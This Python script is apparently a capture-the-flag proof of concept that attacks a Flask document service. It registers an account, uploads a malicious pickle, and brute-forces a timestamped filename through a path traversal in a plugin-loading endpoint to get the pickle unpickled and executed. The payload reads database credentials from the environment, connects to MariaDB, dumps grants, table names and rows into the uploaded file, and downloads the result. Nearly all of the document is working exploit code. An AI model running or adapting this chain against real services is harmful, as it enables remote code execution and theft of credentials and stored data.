#!/usr/bin/env python3
"""CTF proof of concept: turn load-plugin RCE into MariaDB disclosure.

The payload uses the database settings inherited by the Flask worker, connects
with the installed PyMySQL package, and writes a read-only database report into
the uploaded document so it can be downloaded through the application.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import datetime as dt
import json
import pickle
import subprocess
import textwrap
import threading
import uuid
from email.message import Message
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


def request(
    url: str,
    *,
    method: str = "GET",
    body: bytes | None = None,
    content_type: str | None = None,
    token: str | None = None,
    timeout: float = 10,
) -> tuple[int, Message, bytes]:
    headers = {}
    if content_type:
        headers["Content-Type"] = content_type
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = Request(url, data=body, headers=headers, method=method)
    try:
        with urlopen(req, timeout=timeout) as response:
            return response.status, response.headers, response.read()
    except HTTPError as error:
        return error.code, error.headers, error.read()


def json_request(
    base_url: str,
    endpoint: str,
    payload: dict[str, object],
    *,
    token: str | None = None,
    timeout: float = 10,
) -> tuple[int, Message, bytes]:
    return request(
        f"{base_url}{endpoint}",
        method="POST",
        body=json.dumps(payload).encode(),
        content_type="application/json",
        token=token,
        timeout=timeout,
    )


def multipart_file(field: str, filename: str, data: bytes) -> tuple[str, bytes]:
    boundary = f"----ctf-{uuid.uuid4().hex}"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    body += data
    body += f"\r\n--{boundary}--\r\n".encode()
    return f"multipart/form-data; boundary={boundary}", body


def parse_json(status: int, body: bytes, operation: str) -> dict[str, object]:
    try:
        data = json.loads(body)
    except json.JSONDecodeError as error:
        raise RuntimeError(
            f"{operation} returned HTTP {status} with non-JSON data: {body[:200]!r}"
        ) from error
    if status >= 300:
        raise RuntimeError(f"{operation} failed with HTTP {status}: {data}")
    return data


def timestamp_name(timestamp_us: int, basename: str) -> str:
    timestamp = dt.datetime.fromtimestamp(timestamp_us / 1_000_000, dt.timezone.utc)
    return f"{timestamp.strftime('%Y%m%dT%H%M%S%fZ')}__{basename}"


def find_and_trigger_plugin(
    base_url: str,
    token: str,
    login: str,
    basename: str,
    creation: dt.datetime,
    search_ms: int,
    workers: int,
) -> tuple[str, int, bytes]:
    if creation.tzinfo is None:
        creation = creation.replace(tzinfo=dt.timezone.utc)
    else:
        creation = creation.astimezone(dt.timezone.utc)

    newest_us = int(creation.timestamp() * 1_000_000) + 2_000
    attempts = (search_ms + 2) * 1_000 + 1
    stop = threading.Event()
    result: list[tuple[str, int, bytes]] = []
    result_lock = threading.Lock()

    def worker(offset: int) -> None:
        for delta in range(offset, attempts, workers):
            if stop.is_set():
                return
            stored_name = timestamp_name(newest_us - delta, basename)
            traversal = f"../{login}/{stored_name}"
            try:
                status, _, response_body = json_request(
                    base_url,
                    "/api/load-plugin",
                    {"filename": traversal},
                    token=token,
                    timeout=5,
                )
            except (TimeoutError, URLError):
                continue
            if status != 404:
                with result_lock:
                    if not result:
                        result.append((traversal, status, response_body))
                        stop.set()
                return

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(worker, offset) for offset in range(workers)]
        for future in futures:
            future.result()

    if not result:
        raise RuntimeError(
            f"stored filename not found within {search_ms} ms before its DB timestamp; "
            "retry with a larger --search-ms value"
        )
    return result[0]


class DatabaseCapture:
    """Run a read-only database inventory when the server unpickles this object."""

    def __init__(self, login: str, basename: str):
        self.login = login
        self.basename = basename

    def __reduce__(self):
        uploaded_pattern = f"/app/storage/files/{self.login}/*__{self.basename}"
        source = textwrap.dedent(
            f"""
            import glob
            import json
            import os
            import traceback

            import pymysql

            uploaded_pattern = {uploaded_pattern!r}
            report = []

            def clean(value):
                if isinstance(value, bytes):
                    return {{"bytes_hex": value.hex()}}
                if value is None or isinstance(value, (bool, int, float, str)):
                    return value
                return str(value)

            try:
                settings = {{
                    "host": os.environ["DB_HOST"],
                    "port": int(os.environ.get("DB_PORT", "3306")),
                    "database": os.environ["DB_NAME"],
                    "user": os.environ["DB_USER"],
                    "password": os.environ["DB_PASSWORD"],
                }}
                report.append("=== DATABASE CONNECTION SETTINGS ===")
                report.append(json.dumps(settings, indent=2))

                connection = pymysql.connect(
                    host=settings["host"],
                    port=settings["port"],
                    user=settings["user"],
                    password=settings["password"],
                    database=settings["database"],
                    charset="utf8mb4",
                    autocommit=False,
                    connect_timeout=5,
                    read_timeout=10,
                )
                try:
                    with connection.cursor() as cursor:
                        cursor.execute("START TRANSACTION READ ONLY")

                        cursor.execute(
                            "SELECT CURRENT_USER(), USER(), DATABASE(), VERSION()"
                        )
                        identity = cursor.fetchone()
                        report.append("\\n=== DATABASE IDENTITY ===")
                        report.append(json.dumps([clean(v) for v in identity], indent=2))

                        cursor.execute("SHOW GRANTS FOR CURRENT_USER")
                        report.append("\\n=== GRANTS ===")
                        for row in cursor.fetchall():
                            report.append(str(row[0]))

                        cursor.execute(
                            "SELECT TABLE_NAME FROM information_schema.TABLES "
                            "WHERE TABLE_SCHEMA = %s ORDER BY TABLE_NAME",
                            (settings["database"],),
                        )
                        tables = [row[0] for row in cursor.fetchall()]
                        report.append("\\n=== TABLES ===")
                        report.append(json.dumps(tables, indent=2))

                        for table in tables:
                            identifier = "`" + table.replace("`", "``") + "`"
                            cursor.execute(f"SELECT * FROM {{identifier}} LIMIT 100")
                            columns = [description[0] for description in cursor.description]
                            rows = [
                                {{column: clean(value) for column, value in zip(columns, row)}}
                                for row in cursor.fetchall()
                            ]
                            report.append(f"\\n=== TABLE: {{table}} (up to 100 rows) ===")
                            report.append(json.dumps(rows, indent=2, ensure_ascii=False))
                finally:
                    connection.rollback()
                    connection.close()
            except Exception:
                report.append("\\n=== DATABASE CAPTURE ERROR ===")
                report.append(traceback.format_exc())

            output = "\\n".join(report).encode()
            for uploaded_path in glob.glob(uploaded_pattern):
                temporary_path = uploaded_path + ".db-capture"
                with open(temporary_path, "wb") as output_file:
                    output_file.write(output)
                os.replace(temporary_path, uploaded_path)
            """
        )
        return subprocess.call, (["python3", "-c", source],)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://127.0.0.1:5001")
    parser.add_argument("--search-ms", type=int, default=25)
    parser.add_argument("--workers", type=int, default=32)
    parser.add_argument("--output", default="captured_database.txt")
    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")

    identifier = uuid.uuid4().hex[:12]
    login = f"dbctf{identifier}"
    email = f"{login}@example.test"
    password = uuid.uuid4().hex
    basename = f"database_payload_{identifier}.pkl"

    status, _, body = json_request(
        base_url,
        "/api/create-user",
        {"email": email, "login": login, "password": password},
    )
    parse_json(status, body, "create-user")

    status, _, body = json_request(
        base_url,
        "/api/login",
        {"email": email, "password": password},
    )
    login_data = parse_json(status, body, "login")
    token = str(login_data["token"])

    payload = pickle.dumps(DatabaseCapture(login, basename), protocol=4)
    content_type, upload_body = multipart_file("file", basename, payload)
    status, _, body = request(
        f"{base_url}/api/upload-document",
        method="POST",
        body=upload_body,
        content_type=content_type,
        token=token,
    )
    upload = parse_json(status, body, "upload-document")
    document_id = int(upload["id"])
    creation = dt.datetime.fromisoformat(str(upload["creation"]))

    traversal, trigger_status, trigger_body = find_and_trigger_plugin(
        base_url,
        token,
        login,
        basename,
        creation,
        args.search_ms,
        args.workers,
    )
    print(
        f"Triggered {traversal!r}: HTTP {trigger_status} "
        f"{trigger_body.decode(errors='replace')}"
    )

    status, _, report = request(
        f"{base_url}/api/get-document/{document_id}", token=token
    )
    if status != 200:
        raise RuntimeError(
            f"get-document failed with HTTP {status}: "
            f"{report.decode(errors='replace')}"
        )

    with open(args.output, "wb") as output_file:
        output_file.write(report)
    print(report.decode(errors="replace"))
    print(f"Saved database report to {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
